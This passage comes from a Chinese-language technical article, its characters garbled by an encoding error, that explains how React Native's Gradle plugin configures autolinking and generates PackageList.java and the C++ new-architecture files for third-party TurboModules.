    <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºæˆ–è·å–æ ¹é¡¹ç›®çš„ç§æœ‰æ‰©å±•</span>
    <span class="hljs-comment">// æˆ‘ä»¬åœ¨ rootProject ä¸Šæ³¨å†Œä¸€ä¸ªç§æœ‰æ‰©å±•ï¼Œä»¥ä¾¿å°†é¡¹ç›®èŒƒå›´çš„é…ç½®ï¼ˆå¦‚ä»£ç ç”Ÿæˆé…ç½®ï¼‰ä»åº”ç”¨ç¨‹åºé¡¹ç›®ä¼ æ’­åˆ°åº“ã€‚</span>
    <span class="hljs-keyword">val</span> rootExtension = project.rootProject.extensions.findByType(PrivateReactExtension::<span class="hljs-keyword">class</span>.java)
        ?: project.rootProject.extensions.create(
            <span class="hljs-string">"privateReact"</span>,
            PrivateReactExtension::<span class="hljs-keyword">class</span>.java,
            project,
        )

    <span class="hljs-comment">// ç¬¬å››æ­¥ï¼šHermes V1 é…ç½®</span>
    <span class="hljs-keyword">if</span> (project.rootProject.isHermesV1Enabled) {
      rootExtension.hermesV1Enabled.<span class="hljs-keyword">set</span>(<span class="hljs-literal">true</span>)
    }

    <span class="hljs-comment">// ç¬¬äº”æ­¥ï¼šåº”ç”¨é¡¹ç›®ç‰¹å®šé…ç½®</span>
    project.pluginManager.withPlugin(<span class="hljs-string">"com.android.application"</span>) {
      <span class="hljs-comment">// æˆ‘ä»¬å°†æ ¹æ‰©å±•ä¸æ¥è‡ªåº”ç”¨çš„å€¼ï¼ˆç”¨æˆ·å¡«å……æˆ–é»˜è®¤å€¼ï¼‰è¿æ¥èµ·æ¥ã€‚</span>
      rootExtension.root.<span class="hljs-keyword">set</span>(extension.root)
      rootExtension.reactNativeDir.<span class="hljs-keyword">set</span>(extension.reactNativeDir)
      rootExtension.codegenDir.<span class="hljs-keyword">set</span>(extension.codegenDir)
      rootExtension.nodeExecutableAndArgs.<span class="hljs-keyword">set</span>(extension.nodeExecutableAndArgs)

      <span class="hljs-comment">// å»¶è¿Ÿé…ç½®ï¼šåœ¨é¡¹ç›®è¯„ä¼°å®Œæˆåæ‰§è¡Œ</span>
      project.afterEvaluate {
        <span class="hljs-comment">// åœ¨æ‰€æœ‰ç”¨æˆ·é…ç½®å®Œæˆåæ‰§è¡Œ</span>
        <span class="hljs-keyword">val</span> reactNativeDir = extension.reactNativeDir.<span class="hljs-keyword">get</span>().asFile
        <span class="hljs-keyword">val</span> propertiesFile = File(reactNativeDir, <span class="hljs-string">"ReactAndroid/gradle.properties"</span>)
        <span class="hljs-keyword">val</span> hermesVersionPropertiesFile =
            File(reactNativeDir, <span class="hljs-string">"sdks/hermes-engine/version.properties"</span>)
        <span class="hljs-comment">// è¯»å– React Native ç‰ˆæœ¬ä¿¡æ¯</span>
        <span class="hljs-keyword">val</span> versionAndGroupStrings =
            readVersionAndGroupStrings(propertiesFile, hermesVersionPropertiesFile)
        <span class="hljs-keyword">val</span> hermesV1Enabled = rootExtension.hermesV1Enabled.<span class="hljs-keyword">get</span>()
        <span class="hljs-comment">// é…ç½®ä¾èµ–å’Œä»“åº“</span>
        configureDependencies(project, versionAndGroupStrings, hermesV1Enabled)
        configureRepositories(project)
      }

      <span class="hljs-comment">// NDK é…ç½®</span>
      configureReactNativeNdk(project, extension)
      <span class="hljs-comment">// ä¸ºåº”ç”¨é…ç½® BuildConfig å­—æ®µ</span>
      configureBuildConfigFieldsForApp(project, extension)
      <span class="hljs-comment">// é…ç½®å¼€å‘æœåŠ¡å™¨ä½ç½®</span>
      configureDevServerLocation(project)
      <span class="hljs-comment">// é…ç½®å‘åå…¼å®¹æ€§ React æ˜ å°„</span>
      configureBackwardCompatibilityReactMap(project)
      <span class="hljs-comment">// é…ç½® Java å·¥å…·é“¾</span>
      configureJavaToolChains(project)

      <span class="hljs-comment">// AGP å˜ä½“é…ç½®</span>
      project.extensions.getByType(ApplicationAndroidComponentsExtension::<span class="hljs-keyword">class</span>.java).apply {
        onVariants(selector().all()) { variant -&gt;
          <span class="hljs-comment">// ä¸ºæ¯ä¸ªæ„å»ºå˜ä½“ï¼ˆdebugã€release ç­‰ï¼‰é…ç½® React ä»»åŠ¡</span>
          project.configureReactTasks(variant = variant, config = extension)
        }
      }

      <span class="hljs-comment">// å…³é”®ï¼šé…ç½® Autolinking</span>
      configureAutolinking(project, extension)
      <span class="hljs-comment">// é…ç½® Codegenï¼ˆåº”ç”¨é¡¹ç›®ï¼‰</span>
      configureCodegen(project, extension, rootExtension, isLibrary = <span class="hljs-literal">false</span>)
      <span class="hljs-comment">// é…ç½® Android èµ„æº</span>
      configureResources(project, extension)
      <span class="hljs-comment">// ä¸ºåº”ç”¨é…ç½®æ„å»ºç±»å‹</span>
      configureBuildTypesForApp(project)
  }

    <span class="hljs-comment">// åº“é¡¹ç›®ä¸“ç”¨é…ç½®</span>
    configureBuildConfigFieldsForLibraries(project)
    configureNamespaceForLibraries(project)
    project.pluginManager.withPlugin(<span class="hljs-string">"com.android.library"</span>) {
      configureCodegen(project, extension, rootExtension, isLibrary = <span class="hljs-literal">true</span>)
    }
}
</code></pre>
<p>è¿™é‡Œé¢å…³äº<code>configureCodegen</code>æ–¹æ³•è°ƒç”¨ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªé‡è¦å†…å®¹ï¼Œä½†æˆ‘ä»¬æ­¤æ–‡ä¸»è¦æ˜¯åˆ†æä¸‰æ–¹TurboModuleåº“çš„æ³¨å†Œé“¾æ¥ï¼Œæš‚æ—¶æŒ‰ä¸‹ä¸è¡¨ï¼Œåœ¨åé¢ä¸“é¡¹åˆ†æcodegenæœºåˆ¶æ—¶å†æ¥é‡ç‚¹å…³æ³¨ã€‚</p>
<p>æˆ‘ä»¬å…ˆæ¥é‡ç‚¹å…³æ³¨<code>configureAutolinking</code>æ–¹æ³•ï¼Œè¿™æ˜¯ React Native Autolinking æœºåˆ¶åœ¨ Gradle Configuration é˜¶æ®µçš„æ ¸å¿ƒå®ç°ã€‚è¯¥æ–¹æ³•è´Ÿè´£æ³¨å†Œæ‰€æœ‰ Autolinking ç›¸å…³çš„ Gradle ä»»åŠ¡ï¼Œé…ç½®ç›®å½•ç»“æ„ï¼Œå¹¶ä¸ Android Gradle Plugin è¿›è¡Œæ·±åº¦é›†æˆã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/** æ­¤å‡½æ•°ä¸ºåº”ç”¨ç”¨æˆ·è®¾ç½® Autolinking */</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">configureAutolinking</span><span class="hljs-params">(
      project: <span class="hljs-type">Project</span>,          <span class="hljs-comment">// â† å½“å‰ Gradle é¡¹ç›®å®ä¾‹</span>
      extension: <span class="hljs-type">ReactExtension</span>, <span class="hljs-comment">// â† React Native é…ç½®æ‰©å±•</span>
  )</span></span> {
    <span class="hljs-comment">// é…ç½®ç”Ÿæˆçš„ Java æºç ç›®å½•ï¼ˆä½äºbuildç›®å½•ä¸‹ï¼‰</span>
    <span class="hljs-comment">// (å­˜æ”¾ç”Ÿæˆçš„ Java æ–‡ä»¶ï¼ˆPackageList.javaã€ReactNativeApplicationEntryPoint.javaï¼‰)</span>
    <span class="hljs-keyword">val</span> generatedAutolinkingJavaDir: Provider&lt;Directory&gt; =
        project.layout.buildDirectory.dir(<span class="hljs-string">"generated/autolinking/src/main/java"</span>)
    <span class="hljs-comment">// é…ç½®ç”Ÿæˆçš„ JNI æºç ç›®å½•(å­˜æ”¾ç”Ÿæˆçš„ C++ æ–‡ä»¶ï¼Œä¸º React Native æ–°æ¶æ„æä¾› C++ ç»‘å®š)</span>
    <span class="hljs-keyword">val</span> generatedAutolinkingJniDir: Provider&lt;Directory&gt; =
        project.layout.buildDirectory.dir(<span class="hljs-string">"generated/autolinking/src/main/jni"</span>)

    <span class="hljs-comment">// autolinking.json æ–‡ä»¶åœ¨æ ¹æ„å»ºæ–‡ä»¶å¤¹ä¸­å¯ç”¨ï¼Œå› ä¸ºå®ƒæ˜¯ç”±ReactSettingsPlugin.kt ç”Ÿæˆçš„</span>
    <span class="hljs-keyword">val</span> rootGeneratedAutolinkingFile =
        project.rootProject.layout.buildDirectory.file(<span class="hljs-string">"generated/autolinking/autolinking.json"</span>)

    <span class="hljs-comment">// æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªåä¸º generateAutolinkingPackageList çš„ä»»åŠ¡ï¼Œ</span>
    <span class="hljs-comment">// ä»¥å…ä¸ç°æœ‰çš„åä¸º generatePackageList çš„ä»»åŠ¡å†²çªã€‚</span>
    <span class="hljs-comment">// ä¸€æ—¦æˆ‘ä»¬è§£é™¤ rn &lt;-&gt; cliä¾èµ–å…³ç³»ï¼Œè¿™å¯ä»¥é‡å‘½åã€‚</span>
    <span class="hljs-keyword">val</span> generatePackageListTask =
        project.tasks.register(
            <span class="hljs-string">"generateAutolinkingPackageList"</span>,
            GeneratePackageListTask::<span class="hljs-keyword">class</span>.java,
        ) { task -&gt;
          task.autolinkInputFile.<span class="hljs-keyword">set</span>(rootGeneratedAutolinkingFile)        <span class="hljs-comment">// è®¾ç½®è¾“å…¥æ–‡ä»¶ï¼šautolinking.json</span>
          task.generatedOutputDirectory.<span class="hljs-keyword">set</span>(generatedAutolinkingJavaDir) 
          <span class="hljs-comment">// â†‘ è®¾ç½®è¾“å‡ºç›®å½•ï¼šbuild/generated/autolinking/src/main/java</span>
        }

    <span class="hljs-keyword">val</span> generateEntryPointTask =
        project.tasks.register(
            <span class="hljs-string">"generateReactNativeEntryPoint"</span>,
            GenerateEntryPointTask::<span class="hljs-keyword">class</span>.java,
        ) { task -&gt;
          task.autolinkInputFile.<span class="hljs-keyword">set</span>(rootGeneratedAutolinkingFile)
          task.generatedOutputDirectory.<span class="hljs-keyword">set</span>(generatedAutolinkingJavaDir)
        }

    <span class="hljs-comment">// æˆ‘ä»¬è¿˜éœ€è¦ä¸º C++ Autolinking ç”Ÿæˆä»£ç </span>
    <span class="hljs-keyword">val</span> generateAutolinkingNewArchitectureFilesTask =
        project.tasks.register(
            <span class="hljs-string">"generateAutolinkingNewArchitectureFiles"</span>,
            GenerateAutolinkingNewArchitecturesFileTask::<span class="hljs-keyword">class</span>.java,
        ) { task -&gt;
          task.autolinkInputFile.<span class="hljs-keyword">set</span>(rootGeneratedAutolinkingFile)
          task.generatedOutputDirectory.<span class="hljs-keyword">set</span>(generatedAutolinkingJniDir)
        }

    <span class="hljs-comment">// é…ç½® C++ ä»»åŠ¡ä¾èµ–(æ‰§è¡Œé¡ºåºgenerateAutolinkingNewArchitectureFiles â†’ preBuild)</span>
    project.tasks
        .named(<span class="hljs-string">"preBuild"</span>, Task::<span class="hljs-keyword">class</span>.java)
        .dependsOn(generateAutolinkingNewArchitectureFilesTask)

    <span class="hljs-comment">// æˆ‘ä»¬è®© generateAutolinkingPackageList å’Œ generateEntryPoint ä¾èµ–äº preBuild ä»»åŠ¡ï¼Œ</span>
    <span class="hljs-comment">// è¿™æ ·å®ƒå°±ä¼šåœ¨å…¶ä»–æ‰€æœ‰ä»»åŠ¡ä¹‹å‰æ‰§è¡Œã€‚</span>
    project.tasks
        .named(<span class="hljs-string">"preBuild"</span>, Task::<span class="hljs-keyword">class</span>.java)
        .dependsOn(generatePackageListTask, generateEntryPointTask)

    <span class="hljs-comment">// æˆ‘ä»¬å‘Šè¯‰ Android Gradle Pluginï¼Œåœ¨ /build/generated/autolinking/src/main/java ç›®å½•ä¸­</span>
    <span class="hljs-comment">// ä¹Ÿæœ‰éœ€è¦ç¼–è¯‘çš„æºç ã€‚</span>
    project.extensions.getByType(ApplicationAndroidComponentsExtension::<span class="hljs-keyword">class</span>.java).apply {
      onVariants(selector().all()) { variant -&gt;  
        variant.sources.java?.addStaticSourceDirectory( <span class="hljs-comment">// æºç ç›®å½•æ·»åŠ </span>
            generatedAutolinkingJavaDir.<span class="hljs-keyword">get</span>().asFile.absolutePath
        )
      }
    }
  }
</code></pre>
<p>å®Œæ•´ä»»åŠ¡æ‰§è¡Œæµç¨‹å›¾</p>
<pre><code class="hljs language-markdown" lang="markdown">ä»»åŠ¡æ‰§è¡Œé¡ºåºï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. generateAutolinkingPackageList                               â”‚
â”‚    â””â”€â”€ ç”Ÿæˆ PackageList.java                                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 2. generateReactNativeEntryPoint                                â”‚
â”‚    â””â”€â”€ ç”Ÿæˆ ReactNativeApplicationEntryPoint.java              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 3. generateAutolinkingNewArchitectureFiles                     â”‚
â”‚    â””â”€â”€ ç”Ÿæˆ C++ æ–°æ¶æ„ä»£ç                                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">                              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 4. preBuild                                                     â”‚
â”‚    â””â”€â”€ AGP é¢„æ„å»ºä»»åŠ¡                                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 5. åç»­ç¼–è¯‘ä»»åŠ¡                                                  â”‚
â”‚    â”œâ”€â”€ compileDebugJavaWithJavac                               â”‚
â”‚    â”œâ”€â”€ compileDebugKotlin                                      â”‚
â”‚    â””â”€â”€ å…¶ä»–ç¼–è¯‘ä»»åŠ¡...                                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></code></pre>
<p>æµç¨‹å·²ç»éå¸¸æ¸…æ™°ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦ç‰¹åˆ«æ³¨æ„ï¼Œä¸€ä¸ªæ˜¯ä»£ç ç”Ÿæˆçš„ç›®å½•ä¸è¦æé”™ï¼Œè¿™é‡Œæ˜¯æœ‰ä¸¤ä¸ªbuildç›®å½•çš„ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">YourReactNativeApp/                  â† æ ¹é¡¹ç›®
â”œâ”€â”€ android/                         â† Android åº”ç”¨æ¨¡å—
    â””â”€â”€ app
    â”‚        â””â”€â”€build/
    â”‚               â””â”€â”€ generated/autolinking/   â† ReactPlugin ç”Ÿæˆçš„æ–‡ä»¶
    â””â”€â”€ build/                             â† æ ¹é¡¹ç›®æ„å»ºç›®å½•
        â””â”€â”€ generated/
            â””â”€â”€ autolinking/
                â””â”€â”€ autolinking.json     â† ReactSettingsPlugin ç”Ÿæˆçš„æ–‡ä»¶
</code></pre>
<p>ç¬¬äºŒä¸ªæ˜¯AGP æºç ç›®å½•é›†æˆä¹‹åçš„é¡¹ç›®ç»“æ„ï¼š</p>
<pre><code class="hljs language-css" lang="css">Android é¡¹ç›®æºç ç»“æ„ï¼š
app
â””â”€â”€ <span class="hljs-attribute">src</span>/
    â””â”€â”€ <span class="hljs-selector-tag">main</span>/
    â”‚   â”œâ”€â”€ java/                                   â† æ ‡å‡† Java æºç 
    â”‚   â””â”€â”€ kotlin/                                 â† æ ‡å‡† Kotlin æºç 
    â””â”€â”€ build/generated/autolinking/<span class="hljs-attribute">src</span>/<span class="hljs-selector-tag">main</span>/java/  â† åŠ¨æ€æ·»åŠ çš„æºç ç›®å½•
        â””â”€â”€ com/facebook/react/
            â”œâ”€â”€ PackageList<span class="hljs-selector-class">.java</span>                    â† ç”Ÿæˆçš„æ–‡ä»¶
            â””â”€â”€ ReactNativeApplicationEntryPoint<span class="hljs-selector-class">.java</span>
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬æœ‰å¿…è¦äº†è§£ä¸€ä¸‹AGP é›†æˆåŸç†ã€‚ä¸Šé¢ä»£ç ä¸­æ˜¯æœ‰é€šè¿‡<code>addStaticSourceDirectory</code>æ·»åŠ æºç ç›®å½•çš„ï¼Œé¦–å…ˆä¸ºä»€ä¹ˆéœ€è¦æ‰‹åŠ¨æ·»åŠ æºç ç›®å½•ï¼Ÿ</p>
<ul>
<li><strong>åŠ¨æ€ç”Ÿæˆ</strong>ï¼šæºç æ˜¯åœ¨æ„å»ºæ—¶åŠ¨æ€ç”Ÿæˆçš„ï¼Œä¸åœ¨æ ‡å‡†æºç ç›®å½•ä¸­</li>
<li><strong>AGP æ„ŸçŸ¥</strong>ï¼šAGP éœ€è¦çŸ¥é“è¿™äº›æ–‡ä»¶çš„å­˜åœ¨æ‰èƒ½ç¼–è¯‘å®ƒä»¬</li>
<li><strong>å˜ä½“æ”¯æŒ</strong>ï¼šç¡®ä¿æ‰€æœ‰æ„å»ºå˜ä½“éƒ½åŒ…å«ç”Ÿæˆçš„ä»£ç </li>
<li><strong>å¢é‡ç¼–è¯‘</strong>ï¼šAGP å¯ä»¥è·Ÿè¸ªè¿™äº›æ–‡ä»¶çš„å˜åŒ–ï¼Œæ”¯æŒå¢é‡ç¼–è¯‘</li>
</ul>
<h5 data-id="heading-17">GeneratePackageListTask</h5>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åˆ†æ<code>GeneratePackageListTask</code>ç±»çš„å®ç°ï¼Œè¿™å…³ç³»åˆ°ä¸‰æ–¹TurboModule æ¨¡å—çš„æ”¶é›†ã€‚</p>
<p>æºç <code>react-native/packages/gradle-plugin/react-native-gradle-plugin/src/main/kotlin/com/facebook/react/tasks/GeneratePackageListTask.kt</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GeneratePackageListTask</span> : <span class="hljs-type">DefaultTask</span>() {

  <span class="hljs-keyword">init</span> {
    group = <span class="hljs-string">"react"</span>
  }

  <span class="hljs-meta">@get:InputFile</span> 
  <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> autolinkInputFile: RegularFileProperty      <span class="hljs-comment">// â† è¾“å…¥ï¼šautolinking.json</span>

  <span class="hljs-meta">@get:OutputDirectory</span> 
  <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> generatedOutputDirectory: DirectoryProperty <span class="hljs-comment">// â† è¾“å‡ºï¼šç”Ÿæˆç›®å½•</span>

  <span class="hljs-meta">@TaskAction</span>
  <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">taskAction</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šè§£æ autolinking.json</span>
    <span class="hljs-keyword">val</span> model = JsonUtils.fromAutolinkingConfigJson(autolinkInputFile.<span class="hljs-keyword">get</span>().asFile)
        ?: error(
                <span class="hljs-string">"""
                  RNGP - Autolinking: Could not parse autolinking config file:
                  <span class="hljs-subst">${autolinkInputFile.get().asFile.absolutePath}</span>

                  The file is either missing or not containing valid JSON so the build won't succeed. 
                """</span>
                    .trimIndent()
            )

    <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šæå– Android åŒ…å</span>
    <span class="hljs-keyword">val</span> packageName = model.project?.android?.packageName
        ?: error(<span class="hljs-string">"RNGP - Autolinking: Could not find project.android.packageName"</span>)

    <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šè¿‡æ»¤ Android åŒ…</span>
    <span class="hljs-keyword">val</span> androidPackages = filterAndroidPackages(model)

    <span class="hljs-comment">// ç¬¬å››æ­¥ï¼šç”Ÿæˆ import è¯­å¥</span>
    <span class="hljs-keyword">val</span> packageImports = composePackageImports(packageName, androidPackages)

    <span class="hljs-comment">// ç¬¬äº”æ­¥ï¼šç”Ÿæˆå®ä¾‹åŒ–ä»£ç </span>
    <span class="hljs-keyword">val</span> packageClassInstance = composePackageInstance(packageName, androidPackages)

    <span class="hljs-comment">// ç¬¬å…­æ­¥ï¼šç»„åˆæœ€ç»ˆæ–‡ä»¶å†…å®¹</span>
    <span class="hljs-keyword">val</span> generatedFileContents = composeFileContent(packageImports, packageClassInstance)

    <span class="hljs-comment">// ç¬¬ä¸ƒæ­¥ï¼šå†™å…¥ç”Ÿæˆçš„æ–‡ä»¶</span>
    <span class="hljs-keyword">val</span> outputDir = generatedOutputDirectory.<span class="hljs-keyword">get</span>().asFile
    outputDir.mkdirs()
    File(outputDir, GENERATED_FILENAME).apply {
        parentFile.mkdirs()
        writeText(generatedFileContents)
    }
  }
}
</code></pre>
<p>è¿‡æ»¤ Android åŒ…</p>
<ul>
<li><strong>å¹³å°æ£€æŸ¥</strong>ï¼šåªä¿ç•™æœ‰ Android å¹³å°é…ç½®çš„ä¾èµ–</li>
<li><strong>ç±»å‹è¿‡æ»¤</strong>ï¼šæ’é™¤çº¯ C++ ä¾èµ–ï¼ˆå®ƒä»¬ä¸éœ€è¦ Java åŒ…è£…ï¼‰</li>
<li><strong>æ•°æ®è½¬æ¢</strong>ï¼šå°†åˆ—è¡¨è½¬æ¢ä¸º <code>Map&lt;ä¾èµ–å, Androidé…ç½®&gt;</code> æ ¼å¼</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">filterAndroidPackages</span><span class="hljs-params">(
    model: <span class="hljs-type">ModelAutolinkingConfigJson</span>?
)</span></span>: Map&lt;String, ModelAutolinkingDependenciesPlatformAndroidJson&gt; {
    <span class="hljs-keyword">val</span> packages = model?.dependencies?.values ?: emptyList()
    <span class="hljs-keyword">return</span> packages
        .filter { it.platforms?.android != <span class="hljs-literal">null</span> }                         <span class="hljs-comment">// â† å¿…é¡»æœ‰ Android é…ç½®</span>
        .filterNot { it.platforms?.android?.isPureCxxDependency == <span class="hljs-literal">true</span> } <span class="hljs-comment">// â† æ’é™¤çº¯ C++ ä¾èµ–</span>
        .associate { it.name to checkNotNull(it.platforms?.android) }     <span class="hljs-comment">// â† æ„å»ºæ˜ å°„</span>
}
</code></pre>
<p>æ¥çœ‹ä¸€ä¸‹ç”Ÿæˆ <code>PackageList.java</code> çš„æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œå°±ä¼šæ›´åŠ æ¸…æ™°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> generatedFileContentsTemplate =
        <span class="hljs-string">"""
        package com.facebook.react;

        import android.app.Application;
        import android.content.Context;
        import android.content.res.Resources;

        import com.facebook.react.ReactPackage;
        import com.facebook.react.shell.MainPackageConfig;
        import com.facebook.react.shell.MainReactPackage;
        import java.util.Arrays;
        import java.util.ArrayList;

        {{ packageImports }}

        @SuppressWarnings("deprecation")
        public class PackageList {
          private Application application;
          private ReactNativeHost reactNativeHost;
          private MainPackageConfig mConfig;

          public PackageList(ReactNativeHost reactNativeHost) {
            this(reactNativeHost, null);
          }

          public PackageList(Application application) {
            this(application, null);
          }

          public PackageList(ReactNativeHost reactNativeHost, MainPackageConfig config) {
            this.reactNativeHost = reactNativeHost;
            mConfig = config;
          }

          public PackageList(Application application, MainPackageConfig config) {
            this.reactNativeHost = null;
            this.application = application;
            mConfig = config;
          }

          private ReactNativeHost getReactNativeHost() {
            return this.reactNativeHost;
          }

          private Resources getResources() {
            return this.getApplication().getResources();
          }

          private Application getApplication() {
            if (this.reactNativeHost == null) return this.application;
            return this.reactNativeHost.getApplication();
          }

          private Context getApplicationContext() {
            return this.getApplication().getApplicationContext();
          }

          public ArrayList&lt;ReactPackage&gt; getPackages() {
            return new ArrayList&lt;&gt;(Arrays.&lt;ReactPackage&gt;asList(
              new MainReactPackage(mConfig){{ packageClassInstances }}
            ));
          }
        }
        """</span>
            .trimIndent()
</code></pre>
<p>æ³¨æ„åˆ°ï¼Œè¿™é‡Œæ˜¯é€šè¿‡<code>new MainReactPackage(mConfig){{ packageClassInstances }}</code> åŠ¨æ€æ’å…¥äº†æ”¶é›†åˆ°çš„ä¸‰æ–¹TurboModule ã€‚</p>
<h5 data-id="heading-18">GenerateAutolinkingNewArchitecturesFileTask</h5>
<p>æ¥ä¸‹æ¥å†ç ”ç©¶ä¸€ä¸‹<code>GenerateAutolinkingNewArchitecturesFileTask</code>ç±»ï¼Œè¿™å…³ç³»åˆ°æˆ‘ä»¬å‰é¢è¯´çš„çº¯C++ TurboModuleçš„è‡ªåŠ¨é“¾æ¥æ³¨å†Œã€‚</p>
<p>æºç <code>react-native/packages/gradle-plugin/react-native-gradle-plugin/src/main/kotlin/com/facebook/react/tasks/GenerateAutolinkingNewArchitecturesFileTask.kt</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GenerateAutolinkingNewArchitecturesFileTask</span> : <span class="hljs-type">DefaultTask</span>() {
  <span class="hljs-keyword">init</span> {
    group = <span class="hljs-string">"react"</span>
  }
  <span class="hljs-meta">@get:InputFile</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> autolinkInputFile: RegularFileProperty
  <span class="hljs-comment">//  è¾“å‡ºï¼šbuild/generated/autolinking/src/main/jni/</span>
  <span class="hljs-meta">@get:OutputDirectory</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> generatedOutputDirectory: DirectoryProperty

  <span class="hljs-meta">@TaskAction</span>
  <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">taskAction</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 1. è§£æ autolinking.json</span>
    <span class="hljs-keyword">val</span> model = JsonUtils.fromAutolinkingConfigJson(autolinkInputFile.<span class="hljs-keyword">get</span>().asFile)
    <span class="hljs-comment">// 2. è¿‡æ»¤ Android å¹³å°çš„åŒ…</span>
    <span class="hljs-keyword">val</span> packages = filterAndroidPackages(model)
    <span class="hljs-comment">// 3. ç”Ÿæˆ CMake æ–‡ä»¶å†…å®¹</span>
    <span class="hljs-keyword">val</span> cmakeFileContent = generateCmakeFileContent(packages)
    <span class="hljs-comment">// 4. ç”Ÿæˆ C++ æ–‡ä»¶å†…å®¹</span>
    <span class="hljs-keyword">val</span> cppFileContent = generateCppFileContent(packages)
    <span class="hljs-comment">// 5. å†™å…¥æ–‡ä»¶</span>
    <span class="hljs-keyword">val</span> outputDir = generatedOutputDirectory.<span class="hljs-keyword">get</span>().asFile
    outputDir.mkdirs()
    File(outputDir, CMAKE_FILENAME).apply { writeText(cmakeFileContent) }
    File(outputDir, CPP_FILENAME).apply { writeText(cppFileContent) }
    File(outputDir, H_FILENAME).apply { writeText(hTemplate) }
  }

  <span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">filterAndroidPackages</span><span class="hljs-params">(
      model: <span class="hljs-type">ModelAutolinkingConfigJson</span>?
  )</span></span>: List&lt;ModelAutolinkingDependenciesPlatformAndroidJson&gt; =
